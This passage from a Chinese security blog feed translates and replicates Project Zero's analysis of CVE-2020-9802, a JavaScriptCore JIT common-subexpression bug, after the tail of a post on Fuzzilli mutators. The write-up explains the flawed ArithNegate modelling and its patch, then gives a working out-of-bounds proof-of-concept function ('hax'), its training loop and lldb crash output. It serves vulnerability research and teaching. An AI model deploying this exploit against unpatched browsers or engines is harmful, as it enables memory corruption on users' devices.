class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpliceMutator</span>: <span class="hljs-title class_ inherited__">BaseInstructionMutator</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> deadCodeAnalyzer <span class="hljs-operator">=</span> <span class="hljs-type">DeadCodeAnalyzer</span>()<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>() &#123;<br>        <span class="hljs-keyword">super</span>.<span class="hljs-keyword">init</span>(maxSimultaneousMutations: defaultMaxSimultaneousMutations)<br>    &#125;<br>    <span class="hljs-operator">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>随后是<code>ProbingMutator()</code>：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">/// A large bit of the logic of this mutator is located in the lifter code that implements Probe operations</span><br><span class="hljs-comment">/// in the target language. For JavaScript, that logic can be found in JavaScriptProbeLifting.swift.</span><br><span class="hljs-comment">// 这个mutator的大部分逻辑位于用目标语言实现Probe的lifter代码中。对于JavaScript，该逻辑可以在JavaScriptProbeLifting.swift中找到。</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProbingMutator</span>: <span class="hljs-title class_ inherited__">RuntimeAssistedMutator</span> &#123;<br>    <span class="hljs-operator">...</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>() &#123;<br>        <span class="hljs-keyword">super</span>.<span class="hljs-keyword">init</span>(<span class="hljs-string">&quot;ProbingMutator&quot;</span>, verbose: <span class="hljs-type">ProbingMutator</span>.verbose)<br>    &#125;<br>    <span class="hljs-operator">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后是InputMutator，但是根据参数有不同的表现。<code>InputMutator(typeAwareness: x)</code>：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InputMutator</span>: <span class="hljs-title class_ inherited__">BaseInstructionMutator</span> &#123;  <br>    <span class="hljs-operator">...</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>(<span class="hljs-params">typeAwareness</span>: <span class="hljs-type">TypeAwareness</span>) &#123;<br>        <span class="hljs-comment">// 初始化参数</span><br>        <span class="hljs-keyword">self</span>.typeAwareness <span class="hljs-operator">=</span> typeAwareness<br>        <span class="hljs-keyword">self</span>.logger <span class="hljs-operator">=</span> <span class="hljs-type">Logger</span>(withLabel: <span class="hljs-string">&quot;InputMutator <span class="hljs-subst">\(String(describing: typeAwareness))</span>&quot;</span>)<br>        <span class="hljs-keyword">var</span> maxSimultaneousMutations <span class="hljs-operator">=</span> defaultMaxSimultaneousMutations<br>        <span class="hljs-comment">// A type aware instance can be more aggressive. Based on simple experiments and</span><br>        <span class="hljs-comment">// the mutator correctness rates, it can very roughly be twice as aggressive.</span><br>        <span class="hljs-keyword">switch</span> <span class="hljs-keyword">self</span>.typeAwareness &#123;<br>            <span class="hljs-keyword">case</span> .aware:<span class="hljs-comment">// 当typeAwareness为.aware时，将单个测试用例变异次数扩大到原先两倍：7*2</span><br>            maxSimultaneousMutations <span class="hljs-operator">*=</span> <span class="hljs-number">2</span><br>            <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span><br>        &#125;<br>        <span class="hljs-keyword">super</span>.<span class="hljs-keyword">init</span>(name: <span class="hljs-string">&quot;InputMutator (<span class="hljs-subst">\(String(describing: <span class="hljs-keyword">self</span>.typeAwareness))</span>)&quot;</span>, maxSimultaneousMutations: maxSimultaneousMutations)<br>    &#125;<br>    <span class="hljs-operator">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>剩下的<code>OperationMutator()</code>和<code>CombineMutator()</code>在构造函数中没有做什么。</p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2020-9802 JSC编译优化漏洞复现</title>
    <link href="/2025/03/12/CVE-2020-9802-JSC%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/03/12/CVE-2020-9802-JSC%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2020-9802-复现"><a href="#CVE-2020-9802-复现" class="headerlink" title="CVE-2020-9802 复现"></a>CVE-2020-9802 复现</h1><p>翻译自Project Zero的博客：<a href="https://googleprojectzero.blogspot.com/2020/09/jitsploitation-one.html">JITSpoitation</a></p><h2 id="JITSpoitation-I-一个JIT漏洞"><a href="#JITSpoitation-I-一个JIT漏洞" class="headerlink" title="JITSpoitation I : 一个JIT漏洞"></a>JITSpoitation I : 一个JIT漏洞</h2><p>被利用的漏洞<code>CVE-2020-9802</code>已经在IOS 13.5中修复，而两个缓解绕过漏洞<code>CVE-2020-9870</code>和<code>CVE-2020-9910</code>已经在IOS 13.6中修复。</p><h3 id="JIT编译器介绍"><a href="#JIT编译器介绍" class="headerlink" title="JIT编译器介绍"></a>JIT编译器介绍</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">o, y</span>)&#123;<br><span class="hljs-keyword">let</span> x = o.<span class="hljs-property">x</span>;<br><span class="hljs-keyword">return</span> x + y;<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++)&#123;<br><span class="hljs-title function_">foo</span>(&#123;<span class="hljs-attr">x</span>:i&#125;, <span class="hljs-number">42</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>由于JIT编译成本高昂，因此它只会针对于重复执行的代码而编译。因此，函数foo将在解释器（或者 “基线”JIT）内执行一段时间。在此期间，将收集值配置文件，对于foo来说，它看起来如下所示：</p><ul><li>o: JSObject with a property .x at offset 16</li><li>x: Int32</li><li>y: Int32</li></ul><blockquote><p>解释说明：JavaScript对象的内存布局是由JavaScript引擎管理的，具体的实现细节可能因引擎而异，但通常会有一些共同的设计原则。偏移量0-7存储的是隐藏类指针，8-15可能是对齐或元数据等。那么从16开始的8个字节就是属性x的值。</p></blockquote><p>之后，当优化JIT编译器最终启动时，它首先将JavaScript源代码（或更可能是解释器字节码）翻译成JIT编译器自己的中间代码表示。在DFG（JavaScriptCore的优化JIT编译器）中，此操作由<code>DFGByteCodeParser</code>完成。</p><p>那么，经过DFG后的foo函数中间代码表示最初看起来像这样：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali">v0 = GetById o, .x<br>v1 = ValueAdd v0, y<span class="hljs-built_in"></span><br><span class="hljs-built_in">return </span>v1<br></code></pre></td></tr></table></figure><p>这里，<code>GetById</code>和<code>ValueAdd</code>是相当通用（高级）的操作，能够处理不同的输入类型（例如，<code>ValueAdd</code>也能够用来连接字符串）。</p><p>接下来，JIT编译器检查值配置文件，并根据这些配置文件<strong>推测</strong>将来会使用类似的输入类型。在这里，它会推测 o 始终是某种<code>JSObject</code>，而<code>x</code>和<code>y</code>则是<code>Int32</code>。但是，由于无法保证推测始终正确，因此编译器**<em>必须保护推测</em>**，通常使用廉价的运行时类型检查：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">CheckType o, “Object with property .x <span class="hljs-built_in">at</span> offset <span class="hljs-number">16</span>”<br>CheckType y, Int32<br><span class="hljs-built_in">v0</span> = GetByOffset o, <span class="hljs-number">16</span><br>CheckType <span class="hljs-built_in">v0</span>, Int32<br><span class="hljs-built_in">v1</span> = ArithAdd <span class="hljs-built_in">v0</span>, y<br>Return <span class="hljs-built_in">v1</span><br></code></pre></td></tr></table></figure><p>还请注意，<strong>GetById和ValueAdd已专门用于更高效（且不太通用）的GetByOffset和ArithAdd操作</strong>。在DFG中，这种<strong>推测性优化</strong>发生在多个地方。此时，IR代码基本上已输入，因此推测保护允许类型推断。接下来，执行大量代码优化，例如循环不变代码移动或常量折叠。DFG所做的优化概述可从<a href="https://github.com/WebKit/WebKit/blob/main/Source/JavaScriptCore/dfg/DFGPlan.cpp">DFGPlan</a>中提取。</p><p>最后，现已优化的IR被降级为机器码。在DFG中，此操作由<code>DFGSpeculativeJIT</code>直接完成，而在FTL模式下，DFG IR首先被降级为另一个IR B3，该IR经过进一步优化后再降级为机器代码。</p><h3 id="公共子表达式消除（CSE）"><a href="#公共子表达式消除（CSE）" class="headerlink" title="公共子表达式消除（CSE）"></a>公共子表达式消除（CSE）</h3><p>这个优化背后的想法是检测重复的计算（或表达式）并将它们合并为单个计算。例如，请考虑以下JavaScript代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> c = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(a*a + a*a);<br></code></pre></td></tr></table></figure><p>进一步假设<code>a</code>和<code>b</code>是已知原始值（例如数字），则JavaScript JIT编译器可以将代码转换为以下内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> tmp = a*a;<br><span class="hljs-keyword">let</span> c = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(tmp + tmp);<br></code></pre></td></tr></table></figure><p>这样做，可以节省一次<code>ArithMul</code>操作。这种优化称为<strong>公共子表达式消除（CSE）</strong>。</p><p>现在，改用以下JavaScript代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> c = o.<span class="hljs-property">a</span>;<br><span class="hljs-title function_">f</span>();<br><span class="hljs-keyword">let</span> d = o.<span class="hljs-property">a</span>;<br></code></pre></td></tr></table></figure><p>而这种情况下，编译器无法消除CSE期间的第二个属性加载操作，因为中间的函数调用可能会改变<code>.a</code>属性的值。</p><p>在JSC中，某个操作是否可以受CSE约束（以及在什么情况下）的建模是在<code>DFGClobberize</code>中完成的。对于<code>ArithMul</code>，<code>DFGClobberize</code>指出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> ArithMul:<br><span class="hljs-keyword">switch</span> (node-&gt;binaryUseKind()) &#123;<br>    <span class="hljs-keyword">case</span> Int32Use:<br>    <span class="hljs-keyword">case</span> Int52RepUse:<br>    <span class="hljs-keyword">case</span> DoubleRepUse:<br>        def(PureValue(node, node-&gt;arithMode()));<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">case</span> UntypedUse:<br>        clobberTop();<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">default</span>:<br>        DFG_CRASH(graph, node, <span class="hljs-string">&quot;Bad use kind&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>此处<code>PureValue</code>的<code>def()</code>表示计算不依赖于任何上下文，因此当给定相同的输入时，它将始终产生相同的结果。但是，请注意，<code>PureValue</code>由操作<code>ArithMode</code>参数化，<strong>该参数指定操作是否应处理（例如，通过转交给解释器）整数溢出</strong>。在这种情况下，参数化可以防止两个具有不同整数溢出处理方式的<code>ArithMul</code>操作相互替换。处理溢出的操作通常也称为“已检查”操作，“未检查”操作是不检测或不处理溢出的操作。</p><p>相比之下，对于<code>GetByOffset</code>（可用于属性加载），<code>DFGClobberize</code>包含：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> GetByOffset:<br><span class="hljs-type">unsigned</span> identifierNumber = node-&gt;storageAccessData().identifierNumber;<br>AbstractHeap <span class="hljs-title function_">heap</span><span class="hljs-params">(NamedProperties, identifierNumber)</span>;<br>read(heap);<br>def(HeapLocation(NamedPropertyLoc, heap, node-&gt;child2()), LazyNode(node));<br></code></pre></td></tr></table></figure><p>这实质上表明此操作生成的值取决于<code>NamedProperty</code>“<a href="https://github.com/WebKit/webkit/blob/main/Source/JavaScriptCore/dfg/DFGAbstractHeap.h">抽象堆</a>“。因此，只有在两次<code>GetByOffset</code>操作之间没有对<code>NamedProperties</code>抽象堆（<strong>即包含属性值的内存位置</strong>）进行写入的情况下，消除第二次<code>GetByOffset</code>才是合理的。</p><h3 id="The-BUG"><a href="#The-BUG" class="headerlink" title="The BUG"></a>The BUG</h3><p><strong>DFGClobberize</strong> 没有考虑<strong>ArithNegate</strong>操作的<code>ArithMode</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">case</span> <span class="hljs-title class_">ArithNegate</span>:<br><span class="hljs-keyword">if</span> (node-&gt;<span class="hljs-title function_">child1</span>().<span class="hljs-title function_">useKind</span>() == <span class="hljs-title class_">Int32Use</span> || ...)<br>    <span class="hljs-title function_">def</span>(<span class="hljs-title class_">PureValue</span>(node));          <span class="hljs-comment">// &lt;- only the input matters, not the ArithMode</span><br></code></pre></td></tr></table></figure><p>这可能导致CSE用未检查的<code>ArithNegate</code>替代已检查的<code>ArithNegate</code>。对于<code>ArithNegate</code>（32位整数的取反），整数溢出仅在一种特定情况下发生：当对<code>INT_MIN: -2147483648 </code>取反时。这是因为<code>2147483648</code>不能表示32位有符号整数，因此<code>-INT_MIN</code>会导致整数溢出，最后的值依然为<code>INT_MIN</code>，即对<code>INT_MIN</code>取反依然得到<code>INT_MIN</code>。 </p><blockquote><p><strong>这个错误是通过研究<code>DFGClobberize</code>中的CSE def发现的，思考为什么某些<code>PureValues</code>（以及哪些）需要用ArithMode进行参数化，然后搜索缺少该参数化的情况</strong>。</p></blockquote><p>修复这个漏洞的方法非常简单：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">-            def(PureValue(node));<br>+            def(PureValue(node, node-&gt;arithMode()));<br></code></pre></td></tr></table></figure><p>现在教会CSE考虑<code>ArithNegate</code>操作的arithMode。因此，两个具有不同模式的<code>ArithNegate</code>操作不能再相互替代。</p><p>除了<code>ArithNegate</code>之外，<code>DFGClobberize</code>还错过了<code>ArithAbs</code>操作的<code>ArithMode</code>。</p><p>请注意，这种类型的错误可能很难通过模糊测试检测到，因为：</p><ul><li>fuzzer需要在相同的输入上创建两个<code>ArithNegate</code>操作，但使用不同的<code>ArithMode</code></li><li>fuzzer需要触发<code>ArithMode</code>差异有影响的情况，在本例中，这意味着需要对<code>INT_MIN</code>取反。除非引擎有自定义的”sanitizers”（清理器）来尽早检测此类问题，并且除非进行差分模糊测试，否则fuzzer还需要以某种方式将这种情况转化为内存安全违规或断言失败。正如下一节所示，这一步可能是最困难的，并且极不可能偶然发生的。</li></ul><h3 id="实现越界访问"><a href="#实现越界访问" class="headerlink" title="实现越界访问"></a>实现越界访问</h3><p>下面的JavaScript函数通过此漏洞实现了对JSArray的任意索引（在本例中为7）的越界访问：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hax</span>(<span class="hljs-params">arr, n</span>) &#123;<br>    n |= <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">let</span> v = (-n)|<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">let</span> i = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(n);<br>        <span class="hljs-keyword">if</span> (i &lt; arr.<span class="hljs-property">length</span>) &#123;<br>            <span class="hljs-keyword">if</span> (i &amp; <span class="hljs-number">0x80000000</span>) &#123;<br>                i += -<span class="hljs-number">0x7ffffff9</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>) &#123;<br>                arr[i] = <span class="hljs-number">1.04380972981885e-310</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面逐步解释如何构建此POC。本节末尾附上该函数的注释版本。</p><p>首先，<code>ArithNegate</code>仅用于对整数求反（更通用的ValueNegate操作可以对所有JavaScript值求反），但**在_JavaScript规范_中，数字通常是浮点值。**因此，有必要“提示”编译器输入值始终是整数。这很容易实现，只需首先执行按位运算即可，这将始终产生32位有符号整数值：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">n = n|<span class="hljs-number">0</span><span class="hljs-comment">// n will be an integer value now</span><br></code></pre></td></tr></table></figure><blockquote><p>在JavaScript中，数字默认是<strong>64位双精度浮点数</strong>（即IEEE754标准的<code>double</code>类型）。它的整数精度有53位。为什么经过上述运算后它会变成一个32位有符号整数呢？</p><p>因为JavaScript中的位运算符（如<code>|</code>、<code>&amp;</code>、<code>^</code>、<code>~</code>等）在设计上是针对32位有符号整数的。这意味着：</p><ul><li>在执行位运算之前，JavaScript会先将操作数转换为32位有符号整数。</li><li>位运算的结果也是32位有符号整数</li><li>当执行<code>n | 0</code>时，JavaScript会先将n转换为32位有符号整数，然后再与0进行按位或运算。</li></ul><p>由于0的所有位都是0，按位或运算不会改变n的值，但它的副作用是强制将n转换为32位有符号整数。</p></blockquote><p>有了这些，现在就可以构造一个未经检查的<code>ArithNegate</code>操作（之后可以通过公共子表达式消除(CSE)将其替换成一个已检查的操作）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">n = n|<span class="hljs-number">0</span>;<br><span class="hljs-keyword">let</span> v = (-n)|<span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>这里，再DFGFixupPhase期间，n的取反将转换为未检查的ArithNeg运算。编译器可以省略溢出检查，因为取反值的唯一用途是按位或，并且对于溢出值和“正确”值的行为相同：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">js&gt; -<span class="hljs-number">2147483648</span> | <span class="hljs-number">0</span><br>-<span class="hljs-number">2147483648</span><br>js&gt; <span class="hljs-number">2147483648</span> | <span class="hljs-number">0</span><br>-<span class="hljs-number">2147483648</span><br></code></pre></td></tr></table></figure><p>接下来，需要构造一个以n作为输入的已检查ArithNegate操作。获得ArithNegate的一个有趣方法是（原因稍后会变得清晰）是让编译器将ArithAbs操作强度降低为ArithNegate操作。只有当编译器可以证明n为负数时才会发生这种情况，这很容易实现，因为DFG的<code>IntegerRangeOptimization</code>过程是路径敏感的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">n = n|<span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// Compiler knows that n will be a negative integer here</span><br><br>    <span class="hljs-keyword">let</span> v = (-n)|<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">let</span> i = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(n);<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里，在字节码解析期间，对<code>Math.abs</code>的调用将首先被降低为<code>ArithAbs</code>操作，<strong>因为编译器能够证明该调用将始终导致<code>mathAbs</code>函数的执行，因此将其替换为<code>ArithAbs</code>操作</strong>，该操作具有相同的运行时语义，但不需要在运行时进行函数调用。编译器本质上是通过这种方式内联<code>Math.abs</code>。稍后，<code>IntegerRangeOptimization</code>会将<code>ArithAbs</code>转换为经过检查的<code>ArithNegate</code>（必须检查<code>ArithNegate</code>，因为不能排除n的INT_MIN）。因此，if语句中的两个语句本质上（在伪DFG IR中）变为：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">v</span> <span class="hljs-operator">=</span> ArithNeg(unchecked) n<br><span class="hljs-attribute">i</span> <span class="hljs-operator">=</span> ArithNeg(checked) n<br></code></pre></td></tr></table></figure><p>由于漏洞的存在，CSE稍后会变成</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">v</span> <span class="hljs-operator">=</span> ArithNeg(unchecked) n<br><span class="hljs-attribute">i</span> <span class="hljs-operator">=</span> v<br></code></pre></td></tr></table></figure><p>此时，如果使用INT_MIN作为n来调用编译错误的函数，则会导致i也为INT_MIN，尽管它实际上应该是一个正数。</p><p>这本身是一个正确性问题，还不是安全问题。将此错误转变为安全问题的一种（也可能是唯一一种）方法是滥用安全研究人员中已经流行的JIT优化：<strong>边界检查消除（bounds-check elimination）</strong>。</p><p>回到<code>IntegerRangeOptimization</code>过程，i的值已被标记为正数。但是，要消除边界检查，还必须知道该值小于被索引数组的长度。这很容易实现：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hax</span>(<span class="hljs-params">arr, n</span>) &#123;<br>  n = n|<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">let</span> v = (-n)|<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">let</span> i = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(n);<br>    <span class="hljs-keyword">if</span> (i &lt; arr.<span class="hljs-property">length</span>) &#123;<br>        arr[i];<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在触发错误时，i将为INT_MIN，因此将通过比较并执行数组访问。但是，边界检查将被删除，因为<code>IntegerRangeOptimization</code>错误地（虽然从技术上讲不是它的错）确定i始终在边界内。</p><p>在触发该错误之前，必须对JavaScript代码进行JIT编译。这通常只需通过多次执行代码即可实现。但是，如果推测访问在范围内，则对arr的索引访问将仅被降低（通过SSALoweringPhase）到<code>CheckInBounds</code>和未进行边界检查的GetByVal。如果在基线JIT中解释或执行期间经常观察到访问越界，则情况并非如此。因此，在“训练”函数期间，有必要使用合理的边界索引：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-variable constant_">ITERATIONS</span>; i++) &#123;<br>    <span class="hljs-keyword">let</span> n = -<span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">if</span> (i == <span class="hljs-variable constant_">ITERATIONS</span>) &#123;<br>        n = -<span class="hljs-number">2147483648</span>;        <span class="hljs-comment">// INT_MIN</span><br>    &#125;<br>    <span class="hljs-title function_">hax</span>(arr, n);<br>&#125;<br></code></pre></td></tr></table></figure><p>在JSC中运行此代码将会崩溃：</p><blockquote><p>代码我做了一点点改进，因为我发现不加print的话，就会失效。我认为很有可能不加print的话，编译器认为没有访问内存，因此就不会尝试去访问，所以就不会出现Crash。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hax</span>(<span class="hljs-params">arr, n</span>) &#123;<br> n = n|<span class="hljs-number">0</span>;<br> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">0</span>) &#123;<br>   <span class="hljs-keyword">let</span> v = (-n)|<span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">let</span> i = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(n);<br>   <span class="hljs-keyword">if</span> (i &lt; arr.<span class="hljs-property">length</span>) &#123;<br>     <span class="hljs-title function_">print</span>(arr[i]);<br>   &#125;<br> &#125;<br>&#125;<br><span class="hljs-keyword">var</span> arr = [<span class="hljs-number">13.37</span>, <span class="hljs-number">2.2</span>, <span class="hljs-number">3.3</span>]<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ITERATIONS</span> = <span class="hljs-number">0xc0000</span>;<br><br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-variable constant_">ITERATIONS</span>; i++)&#123;<br> <span class="hljs-keyword">let</span> n = -<span class="hljs-number">2</span>;<br> <span class="hljs-keyword">if</span>(i == <span class="hljs-variable constant_">ITERATIONS</span>)&#123;<br>     n = -<span class="hljs-number">2147483648</span>;            <span class="hljs-comment">// INT_MIN</span><br> &#125;<br> <span class="hljs-title function_">hax</span>(arr, n);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>最后执行即可<code>lldb ./jsc ./test.js</code>然后<code>run</code>即可。出现crash如下所示：</p><img src="/2025/03/12/CVE-2020-9802-JSC%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250312213621314.png" class="" title="image-20250312213621314"></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">lldb -- /System/Library/Frameworks/JavaScriptCore<span class="hljs-number">.</span>framework/Resources/jsc poc<span class="hljs-number">.</span><span class="hljs-keyword">js</span><br>   (lldb) r<br>   Process <span class="hljs-number">12237</span> stopped<br>   * thread #<span class="hljs-number">1</span>, queue = <span class="hljs-string">&#x27;com.apple.main-thread&#x27;</span>, stop reason = EXC_BAD_ACCESS (code=<span class="hljs-number">1</span>, address=<span class="hljs-number">0x1c1fc61348</span>)<br>       frame #<span class="hljs-number">0</span>: <span class="hljs-number">0x000051fcfaa06f2e</span><br>   -&gt;  <span class="hljs-number">0x51fcfaa06f2e</span>: <span class="hljs-keyword">movsd</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">8</span>*<span class="hljs-built_in">rcx</span>] <span class="hljs-comment">; xmm0 = 